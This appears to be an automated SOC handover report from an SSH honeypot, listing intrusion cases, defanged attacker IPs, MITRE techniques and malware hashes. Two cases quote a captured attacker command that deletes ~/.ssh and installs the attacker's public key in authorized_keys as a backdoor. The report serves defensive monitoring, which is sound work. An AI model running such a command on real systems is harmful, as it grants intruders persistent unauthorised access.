| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:21:33` | `cowrie.session.connect` |
| `2026-05-19 07:21:33` | `cowrie.client.version` |
| `2026-05-19 07:21:33` | `cowrie.client.kex` |
| `2026-05-19 07:21:33` | `cowrie.login.success` |
| `2026-05-19 07:21:33` | `cowrie.session.params` |
| `2026-05-19 07:21:33` | `cowrie.command.input` |
| `2026-05-19 07:21:33` | `cowrie.command.failed` |
| `2026-05-19 07:21:33` | `cowrie.log.closed` |
| `2026-05-19 07:21:33` | `cowrie.session.params` |
| `2026-05-19 07:21:33` | `cowrie.command.input` |
| `2026-05-19 07:21:33` | `cowrie.session.file_download` |
| `2026-05-19 07:21:33` | `cowrie.log.closed` |
| `2026-05-19 07:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d90e08ad63f9

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:21 |
| **Last Seen** | 2026-05-19 07:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:21:34` | `cowrie.session.connect` |
| `2026-05-19 07:21:34` | `cowrie.client.version` |
| `2026-05-19 07:21:34` | `cowrie.client.kex` |
| `2026-05-19 07:21:35` | `cowrie.login.success` |
| `2026-05-19 07:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da1fd5203bf

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:25 |
| **Last Seen** | 2026-05-19 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:25:56` | `cowrie.session.connect` |
| `2026-05-19 07:25:56` | `cowrie.client.version` |
| `2026-05-19 07:25:56` | `cowrie.client.kex` |
| `2026-05-19 07:25:56` | `cowrie.login.success` |
| `2026-05-19 07:25:56` | `cowrie.session.params` |
| `2026-05-19 07:25:56` | `cowrie.command.input` |
| `2026-05-19 07:25:56` | `cowrie.command.failed` |
| `2026-05-19 07:25:56` | `cowrie.log.closed` |
| `2026-05-19 07:25:56` | `cowrie.session.params` |
| `2026-05-19 07:25:56` | `cowrie.command.input` |
| `2026-05-19 07:25:56` | `cowrie.session.file_download` |
| `2026-05-19 07:25:56` | `cowrie.log.closed` |
| `2026-05-19 07:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af148f1910d8

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:25 |
| **Last Seen** | 2026-05-19 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:25:57` | `cowrie.session.connect` |
| `2026-05-19 07:25:57` | `cowrie.client.version` |
| `2026-05-19 07:25:57` | `cowrie.client.kex` |
| `2026-05-19 07:25:58` | `cowrie.login.success` |
| `2026-05-19 07:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ef6d0f2b7c

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:27 |
| **Last Seen** | 2026-05-19 07:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:27:28` | `cowrie.session.connect` |
| `2026-05-19 07:27:28` | `cowrie.client.version` |
| `2026-05-19 07:27:28` | `cowrie.client.kex` |
| `2026-05-19 07:27:28` | `cowrie.login.success` |
| `2026-05-19 07:27:28` | `cowrie.session.params` |
| `2026-05-19 07:27:28` | `cowrie.command.input` |
| `2026-05-19 07:27:28` | `cowrie.command.failed` |
| `2026-05-19 07:27:28` | `cowrie.log.closed` |
| `2026-05-19 07:27:28` | `cowrie.session.params` |
| `2026-05-19 07:27:28` | `cowrie.command.input` |
| `2026-05-19 07:27:28` | `cowrie.session.file_download` |
| `2026-05-19 07:27:28` | `cowrie.log.closed` |
| `2026-05-19 07:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24b680ee4c6

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:27 |
| **Last Seen** | 2026-05-19 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:27:30` | `cowrie.session.connect` |
| `2026-05-19 07:27:30` | `cowrie.client.version` |
| `2026-05-19 07:27:30` | `cowrie.client.kex` |
| `2026-05-19 07:27:30` | `cowrie.login.success` |
| `2026-05-19 07:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.156.81[.]221` | **33** | 2026-05-19 04:38 | 2026-05-19 04:39 | 2m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.62.84[.]93` | **33** | 2026-05-19 05:58 | 2026-05-19 05:59 | 6m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.195.58[.]205` | **33** | 2026-05-19 05:11 | 2026-05-19 05:12 | 2m | 4 | `T1110.001` | 🟠 MEDIUM |
| `45.148.120[.]187` | **28** | 2026-05-19 03:54 | 2026-05-19 07:50 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `115.241.83[.]2` | **21** | 2026-05-19 06:56 | 2026-05-19 07:27 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.231.180[.]120` | **4** | 2026-05-19 04:18 | 2026-05-19 04:21 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `116.99.174[.]106` | **3** | 2026-05-19 04:34 | 2026-05-19 04:38 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `171.231.189[.]104` | **2** | 2026-05-19 04:20 | 2026-05-19 04:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-05-19 04:28 | 2026-05-19 04:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.79.2[.]177` | **2** | 2026-05-19 06:51 | 2026-05-19 06:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.117.56[.]120` | 1 | 2026-05-19 07:00 | 2026-05-19 07:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-19 05:08 | 2026-05-19 05:08 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.104[.]36` | 1 | 2026-05-19 07:00 | 2026-05-19 07:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.251.169[.]213` | 1 | 2026-05-19 07:02 | 2026-05-19 07:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-05-19 03:54 | 2026-05-19 03:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `197.243.0[.]62` | 1 | 2026-05-19 06:59 | 2026-05-19 06:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.71.30[.]159` | 1 | 2026-05-19 06:52 | 2026-05-19 06:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.147.249[.]81` | 1 | 2026-05-19 03:56 | 2026-05-19 03:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.133.60[.]87` | 1 | 2026-05-19 07:17 | 2026-05-19 07:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `76.39.119[.]122` | 1 | 2026-05-19 04:09 | 2026-05-19 04:09 | 3s | 0 | `T1592` | 🟢 LOW |
| `8.154.5[.]231` | 1 | 2026-05-19 07:02 | 2026-05-19 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `86.164.84[.]252` | 1 | 2026-05-19 04:23 | 2026-05-19 04:25 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `171.231.180[.]120` | VN | Viettel Group | **100** ⚠️ | 2 |
| `34.156.81[.]221` | BE | Google LLC | **100** ⚠️ | 1 |
| `171.231.189[.]104` | VN | Viettel Group | **100** ⚠️ | 1 |
| `86.164.84[.]252` | GB | BT Infrastructure Layer | **100** ⚠️ | 1 |
| `76.39.119[.]122` | US | Charter Communications Inc | **100** ⚠️ | 3 |
| `62.133.60[.]87` | DE | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 13 |
| `34.79.2[.]177` | BE | Google LLC | **100** ⚠️ | 1 |
| `8.154.5[.]231` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 1 |
| `14.103.104[.]36` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.117.56[.]120` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 89 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 41 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 224 cases |
| Tool 34  | Credential Extractor        | ✅ 95 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (7.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 35 priority case(s) shown individually · 22 recon entry/entries in table (10 group(s) consolidating 161 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-19T07:52:28Z_
